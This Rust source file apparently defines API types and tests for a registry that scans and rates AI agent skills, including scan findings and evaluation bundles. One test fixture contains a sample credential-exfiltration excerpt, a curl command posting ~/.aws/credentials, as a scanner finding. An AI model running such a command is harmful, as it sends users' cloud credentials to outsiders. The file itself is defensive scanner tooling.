//! Wire types for the SkillRank registry. Field names and JSON shapes match the
//! `/v3/rest/skill-registry` contract (snake_case), so this core crate is the
//! single source of truth shared by the CLI and by BuildBetter ZeroShot.

use serde::{Deserialize, Serialize};

/// Published static-scan verdict for a skill version.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum ScanTier {
    Safe,
    Low,
    Medium,
    High,
    Flagged,
    Pending,
    #[default]
    Unknown,
}

impl ScanTier {
    /// Safe to install without an extra confirmation prompt.
    pub fn is_safe(self) -> bool {
        matches!(self, ScanTier::Safe | ScanTier::Low)
    }
    pub fn as_str(self) -> &'static str {
        match self {
            ScanTier::Safe => "safe",
            ScanTier::Low => "low",
            ScanTier::Medium => "medium",
            ScanTier::High => "high",
            ScanTier::Flagged => "flagged",
            ScanTier::Pending => "pending",
            ScanTier::Unknown => "unknown",
        }
    }
}

impl std::fmt::Display for ScanTier {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// How much a published eval result has been vouched for. Tiers are never mixed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TrustTier {
    Official,
    CommunityReported,
    SelfReported,
}

fn is_zero(n: &i64) -> bool {
    *n == 0
}

/// One row in a search result.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SkillSummary {
    pub slug: String,
    pub display_name: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub category: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub stacks: Vec<String>,
    pub source_type: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub source_url: String,
    pub latest_version: String,
    pub scan_tier: ScanTier,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signals_score: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub rating_average: Option<f64>,
    #[serde(default, skip_serializing_if = "is_zero")]
    pub rating_count: i64,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub summary: String,
}

/// One value of one facet, and how many catalog entries carry it.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FacetCount {
    pub value: String,
    #[serde(default)]
    pub count: i64,
}

/// The filter vocabulary the catalog actually has (`GET /skills/facets`), ordered
/// by count desc. Every `value` is a term [`SearchOptions`](crate::client::SearchOptions)
/// matches and every `count` is the `total` that filter returns, so a client can
/// offer these as filter options instead of guessing a list that matches nothing.
///
/// `scan_tiers` values are plain strings, not [`ScanTier`]: a tier the client does
/// not know about yet must show up as an option, not fail the whole response.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SkillFacets {
    #[serde(default)]
    pub categories: Vec<FacetCount>,
    #[serde(default)]
    pub stacks: Vec<FacetCount>,
    #[serde(default)]
    pub scan_tiers: Vec<FacetCount>,
}

/// Paginated search payload.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SearchResponse {
    #[serde(default)]
    pub items: Vec<SkillSummary>,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub next_cursor: String,
    #[serde(default)]
    pub total: i64,
}

/// A single content-hashed version.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SkillVersion {
    pub content_hash: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub pinned_commit: String,
    pub scan_tier: ScanTier,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signals_score: Option<f64>,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub published_at: String,
}

/// One thing the static scan found, and why it matters.
///
/// A tier on its own is not actionable — "medium risk" tells a user to click
/// through. These carry the matching line so a confirmation prompt can show
/// exactly what triggered the verdict.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ScanFinding {
    /// Stable rule id, e.g. `credential-exfiltration`, `pipe-to-shell-untrusted`.
    #[serde(default)]
    pub rule: String,
    /// `critical` | `high` | `medium` | `info`. A plain string, not an enum: a
    /// severity this client does not know yet must render, not fail the response.
    #[serde(default)]
    pub severity: String,
    /// 1-based line in `SKILL.md`; `0` when the finding is about the file itself.
    #[serde(default)]
    pub line: i64,
    /// The matching line, whitespace-collapsed and truncated.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub excerpt: String,
    /// Plain-English explanation of the risk, written for the person installing.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub why: String,
}

/// The evidence behind [`ScanTier`], served alongside it.
///
/// Optional and additive on every response that carries it, so a registry that
/// has not been re-ingested yet simply omits it.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ScanReport {
    pub tier: ScanTier,
    #[serde(default)]
    pub score: f64,
    /// Which ruleset produced this verdict; lets a client tell a stale tier from
    /// a current one, and lets tiers be compared across scanner versions.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub scanner_version: String,
    #[serde(default)]
    pub findings: Vec<ScanFinding>,
}

/// One (tier, cell) rollup shown on a skill page.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvalSummaryCell {
    pub tier: TrustTier,
    pub agent: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub agent_version_band: String,
    pub model: String,
    pub suite: String,
    pub suite_version: String,
    pub n_accounts: i64,
    pub n_trials: i64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub success_lift_pct: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub net_token_delta_pct: Option<f64>,
    pub gated: bool,
}

/// Full skill page payload.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SkillDetail {
    #[serde(flatten)]
    pub summary: SkillSummary,
    #[serde(default)]
    pub versions: Vec<SkillVersion>,
    #[serde(default)]
    pub eval_cells: Vec<EvalSummaryCell>,
    /// Why the scan landed where it did. Absent on registries that predate the
    /// scanner, and omitted for skills with nothing to report.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub scan: Option<ScanReport>,
}

/// What `install` needs to fetch and verify a skill.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ResolveResponse {
    pub slug: String,
    pub version: String,
    pub source_type: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub source_url: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub source_subpath: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub pinned_commit: String,
    pub content_hash: String,
    pub scan_tier: ScanTier,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signals_score: Option<f64>,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub inline_content: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub raw_content_url: String,
    #[serde(default)]
    pub tombstoned: bool,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub tombstone_reason: String,
    /// Evidence for `scan_tier`, so an install confirmation can name the exact
    /// line that made a skill risky instead of saying "unverified".
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub scan: Option<ScanReport>,
}

// ---- Eval types (used by the runner and `skillrank eval`) ----

/// Treatment/control condition of a single trial.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TrialArm {
    Control,
    Treatment,
}

impl TrialArm {
    pub fn as_str(self) -> &'static str {
        match self {
            TrialArm::Control => "control",
            TrialArm::Treatment => "treatment",
        }
    }
}

/// One agent run against one task in one arm.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrialRecord {
    pub task_id: String,
    pub arm: TrialArm,
    /// "pass" | "fail" | "agent_error" | "verifier_error"
    pub verdict: String,
    #[serde(default)]
    pub input_tokens: i64,
    #[serde(default)]
    pub output_tokens: i64,
    #[serde(default)]
    pub cache_read_tokens: i64,
    #[serde(default)]
    pub cache_write_tokens: i64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cost_usd: Option<f64>,
    #[serde(default)]
    pub duration_ms: i64,
    #[serde(default)]
    pub turns: i64,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub trajectory_digest: String,
}

/// Keys where a bundle's results are comparable.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct EnvironmentCell {
    pub agent: String,
    pub agent_version_band: String,
    pub model: String,
    pub os: String,
    /// "docker" | "worktree"
    pub isolation: String,
}

/// Which runner produced a bundle.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HarnessInfo {
    pub name: String,
    pub version: String,
}

/// The versioned result artifact written locally and (optionally) published.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvalBundle {
    pub bundle_version: i32,
    pub skill_slug: String,
    pub skill_content_hash: String,
    pub suite_id: String,
    pub suite_version: String,
    pub harness: HarnessInfo,
    pub environment_cell: EnvironmentCell,
    pub trials: Vec<TrialRecord>,
    pub config_hash: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub created_at: String,
}

/// Pins the codebase an eval runs against.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SuiteFixture {
    pub git_url: String,
    pub commit: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub image: String,
}

/// One deterministic task in an eval suite (public contract fields only).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SuiteTask {
    pub id: String,
    pub instruction: String,
    #[serde(default)]
    pub verifier_contract: String,
    #[serde(default)]
    pub timeout_sec: i64,
    #[serde(default)]
    pub est_tokens: i64,
    #[serde(default)]
    pub est_cost_usd: f64,
}

/// Pinned agent/model band a run must match to be eligible for aggregation.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ReferenceEnv {
    #[serde(default)]
    pub agent_version_band: String,
    #[serde(default)]
    pub models: Vec<String>,
}

/// A full eval suite definition (public fields only).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Suite {
    pub id: String,
    pub version: String,
    #[serde(default)]
    pub fixture: SuiteFixture,
    #[serde(default)]
    pub tasks: Vec<SuiteTask>,
    #[serde(default)]
    pub reference_env: ReferenceEnv,
}

/// One row of the eval-suite index (`GET /eval-suites`). Task bodies are not in
/// this payload — fetch [`Suite`] once the caller has picked an id.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SuiteSummary {
    pub id: String,
    pub version: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub title: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub description: String,
    #[serde(default)]
    pub task_count: i64,
    #[serde(default)]
    pub reference_env: ReferenceEnv,
}

/// The eval-suite index. Without it a suite id can only be typed from memory.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SuiteListResponse {
    #[serde(default)]
    pub items: Vec<SuiteSummary>,
    #[serde(default)]
    pub total: i64,
}

/// A newly minted registry token. The plaintext `token` is returned exactly
/// once — store it (see `config::auth_path`) or it is gone.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct TokenGrant {
    pub token: String,
    /// "anonymous", or the identity provider that vouched for the account.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub kind: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub account_id: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub created_at: String,
    /// Only verified accounts count toward Community-reported corroboration.
    #[serde(default)]
    pub verified: bool,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub note: String,
}

/// A started GitHub device authorization. The user types `user_code` at
/// `verification_uri`; the client polls with `device_code`, which is the secret
/// half and must never be shown.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct DeviceAuthorization {
    pub device_code: String,
    /// Short code the user reads off the screen and types into GitHub.
    pub user_code: String,
    pub verification_uri: String,
    /// Seconds the registry asks the client to wait between polls.
    #[serde(default)]
    pub interval: u64,
    #[serde(default)]
    pub expires_in: u64,
}

/// One poll of a device authorization: still waiting, or a granted token.
///
/// Waiting is an ordinary outcome rather than an error, because the whole flow
/// is "keep asking until the human finishes in their browser".
#[derive(Debug, Clone)]
pub enum DevicePoll {
    /// Nobody has approved yet. `interval` is the registry's current pacing ask,
    /// which rises when it answers `slow_down`.
    Pending { interval: u64 },
    Granted(Box<TokenGrant>),
}

/// Returned when a bundle is submitted.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct IngestResponse {
    pub accepted: bool,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub result_id: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub tier_state: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub reason: String,
    #[serde(default)]
    pub conforming: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Verbatim `GET /skills/<slug>/resolve` from the running registry. The
    /// point is the `scan` object: it is new, and an ALREADY-COMPILED client
    /// must keep parsing responses that carry it.
    const RESOLVE_WITH_SCAN: &str = r#"{
      "slug":"nanocoai/add-opencode",
      "version":"sha256:7451f3c0",
      "source_type":"github",
      "source_url":"https://github.com/nanocoai/nanoclaw",
      "source_subpath":".claude/skills/add-opencode/SKILL.md",
      "pinned_commit":"0b034342fc19fea2c95da20c2a42b4eaa31f5d84",
      "content_hash":"sha256:7451f3c0",
      "scan_tier":"high",
      "signals_score":63,
      "raw_content_url":"https://raw.githubusercontent.com/x/y/z/SKILL.md",
      "tombstoned":false,
      "scan":{"tier":"high","score":45,"scanner_version":"1.0.0","findings":[
        {"rule":"model-traffic-relay","severity":"high","line":226,
         "excerpt":"ANTHROPIC_BASE_URL=https://opencode.ai/zen/v1",
         "why":"This points ANTHROPIC_BASE_URL at a host that is not the model vendor."}]}
    }"#;

    #[test]
    fn resolve_carries_scan_findings() {
        let r: ResolveResponse = serde_json::from_str(RESOLVE_WITH_SCAN).unwrap();
        assert_eq!(r.scan_tier, ScanTier::High);
        assert!(!r.scan_tier.is_safe(), "high must still prompt");
        let scan = r.scan.expect("scan report should deserialize");
        assert_eq!(scan.tier, ScanTier::High);
        assert_eq!(scan.scanner_version, "1.0.0");
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].rule, "model-traffic-relay");
        assert_eq!(scan.findings[0].line, 226);
        assert!(
            scan.findings[0].why.len() > 20,
            "a finding must explain itself"
        );
    }

    /// A registry that has not been re-ingested yet simply omits `scan`, and an
    /// unrecognized field must not fail the response either.
    #[test]
    fn scan_is_optional_and_unknown_fields_are_ignored() {
        let older = r#"{"slug":"a/b","version":"v","source_type":"github",
          "content_hash":"sha256:x","scan_tier":"low","future_field":{"a":1}}"#;
        let r: ResolveResponse = serde_json::from_str(older).unwrap();
        assert!(r.scan.is_none());
        assert!(r.scan_tier.is_safe());

        let detail = r#"{"slug":"a/b","display_name":"B","source_type":"github",
          "latest_version":"sha256:x","scan_tier":"safe","versions":[],"eval_cells":[]}"#;
        let d: SkillDetail = serde_json::from_str(detail).unwrap();
        assert!(d.scan.is_none());
        assert_eq!(d.summary.scan_tier, ScanTier::Safe);
    }

    /// Every tier the scanner can emit must round-trip through the enum. A
    /// mismatch between `registry/lib/scan.mjs` and this list fails the WHOLE
    /// response, not just one field.
    #[test]
    fn every_scan_tier_round_trips() {
        for (text, tier, safe) in [
            ("safe", ScanTier::Safe, true),
            ("low", ScanTier::Low, true),
            ("medium", ScanTier::Medium, false),
            ("high", ScanTier::High, false),
            ("flagged", ScanTier::Flagged, false),
            ("pending", ScanTier::Pending, false),
            ("unknown", ScanTier::Unknown, false),
        ] {
            let parsed: ScanTier = serde_json::from_str(&format!("\"{text}\"")).unwrap();
            assert_eq!(parsed, tier);
            assert_eq!(parsed.is_safe(), safe, "{text} changed prompt behaviour");
            assert_eq!(
                serde_json::to_string(&parsed).unwrap(),
                format!("\"{text}\"")
            );
        }
    }

    /// Serializing a report back out keeps the wire names the registry uses.
    #[test]
    fn scan_report_serializes_with_registry_field_names() {
        let report = ScanReport {
            tier: ScanTier::Flagged,
            score: 100.0,
            scanner_version: "1.0.0".into(),
            findings: vec![ScanFinding {
                rule: "credential-exfiltration".into(),
                severity: "critical".into(),
                line: 11,
                excerpt: "curl -d \"$(cat ~/.aws/credentials)\"".into(),
                why: "This reads credentials and sends them to a fixed host.".into(),
            }],
        };
        let json = serde_json::to_string(&report).unwrap();
        assert!(json.contains("\"scanner_version\":\"1.0.0\""), "{json}");
        assert!(json.contains("\"tier\":\"flagged\""), "{json}");
        assert!(json.contains("\"severity\":\"critical\""), "{json}");
    }
}
